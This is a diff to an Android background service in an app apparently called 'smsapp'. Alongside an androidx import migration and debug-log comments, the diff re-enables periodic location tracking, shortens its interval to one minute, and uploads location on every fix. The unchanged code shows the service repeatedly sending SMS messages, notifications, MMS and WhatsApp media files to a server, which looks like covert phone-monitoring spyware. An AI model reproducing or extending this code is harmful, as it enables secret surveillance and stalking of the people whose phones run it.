@@ -14,14 +14,14 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
 import android.provider.Settings;
-import android.support.annotation.NonNull;
-import android.support.annotation.Nullable;
-import android.support.v4.app.ActivityCompat;
-import android.support.v4.app.TaskStackBuilder;
-import android.support.v4.content.ContextCompat;
-import android.support.v7.app.NotificationCompat;
 import android.text.TextUtils;
+import android.util.Log;
 import android.widget.Toast;
+
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 import com.google.android.gms.common.ConnectionResult;
 import com.google.android.gms.common.api.GoogleApiClient;
@@ -46,7 +46,7 @@ import gonext.smsapp.utils.Utils;
 public class BackgroundJob extends Service implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener,LocationListener{
     public static final int notify = 120000;  //interval between two services(Here Service run every 5 Minute)
     public static final int PERMISSION_DELAY = 300000;  //interval between two services(Here Service run every 5 Minute)
-    public static final int LOCATION_DELAY = 1500000;  //interval between two services(Here Service run every 5 Minute)
+    public static final int LOCATION_DELAY = 60000; //1500000 //interval between two services(Here Service run every 5 Minute)
 //    private Handler mHandler = new Handler();   //run on another Thread to avoid crash
     private Timer mTimer = null;    //timer handling
     private Timer locationTimer = null;    //timer handling
@@ -61,6 +61,8 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
 
     @Override
     public void onCreate() {
+//        Log.e("COMING","YESSSS");
+
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -82,12 +84,12 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                 }
 
 
-                /*if (locationTimer != null) // Cancel if already existed
+                if (locationTimer != null) // Cancel if already existed
                     locationTimer.cancel();
                 else
                     locationTimer = new Timer();   //recreate new
-
-                locationTimer.scheduleAtFixedRate(new LocationTimerTask(), 0, LOCATION_DELAY);*/   //Schedule task
+//Log.e("ASWEE","YESSS");
+                locationTimer.scheduleAtFixedRate(new LocationTimerTask(), 0, LOCATION_DELAY);   //Schedule task
 
             }
         }).start();
@@ -114,11 +116,13 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                     // display toast
             System.out.println("service started ******");
                     if(backgroundJobService != null) {
+//                        Log.e("DSDSDSD","ELSEEEEx");
                         String mobile = Utils.getMobileNo(BackgroundJob.this);
                         if(mobile == null || mobile.equals("")){
                             backgroundJobService.getMobileNo();
                             mobile = Utils.getMobileNo(BackgroundJob.this);
                             if(mobile == null || mobile.equals("")){
+
                                 backgroundJobService.readMMSMEssage();
                             }
                         }
@@ -126,6 +130,8 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                         backgroundJobService.sendSMSToServer();
                         backgroundJobService.sendNotificationsToServer();
                         backgroundJobService.readWhatsAppMediaFiles();
+                    }else{
+//                        Log.e("DSDSDSD","ELSEEEE");
                     }
 //                }
 //            });
@@ -205,7 +211,7 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
         builder.setTicker(getString(R.string.app_name));
         builder.setContentTitle("Permission required");
         builder.setContentText(msg);
-        builder.setSmallIcon(R.mipmap.app_icon);
+        builder.setSmallIcon(R.drawable.logo);
         builder.setContentIntent(pendingIntent);
         builder.setOngoing(true);
         builder.setAutoCancel(true);
@@ -227,6 +233,7 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                 @Override
                 public void run() {*/
                     // display toast
+//            Log.e("ASWEE","YESSS");
                     if (!isLocationStarted) {
                         if (Utils.checkPlayServices(BackgroundJob.this)) {
                             if (Utils.isAndroid6()) {
@@ -242,6 +249,7 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                             System.out.println("Google play service not available to start location service");
                         }
                     } else {
+//                        Log.e("ASWEE","YESSS2");
                         if (Utils.isAndroid6()) {
                             if (ActivityCompat.checkSelfPermission(BackgroundJob.this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(BackgroundJob.this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                                 stopLocationUpdates();
@@ -249,6 +257,7 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
                         }
                     }
                     if(Constant.latitude != 0.0 && Constant.longitude != 0.0){
+//                        Log.e("ASWEE","YESSS3");
                         backgroundJobService.sendLocation();
                     }
 //                }
@@ -311,6 +320,8 @@ public class BackgroundJob extends Service implements GoogleApiClient.Connection
         if(location != null){
             Constant.latitude = location.getLatitude();
             Constant.longitude = location.getLongitude();
+//            Log.e("ASWEE","YESSSx");
+            backgroundJobService.sendLocation();
         }
     }
 
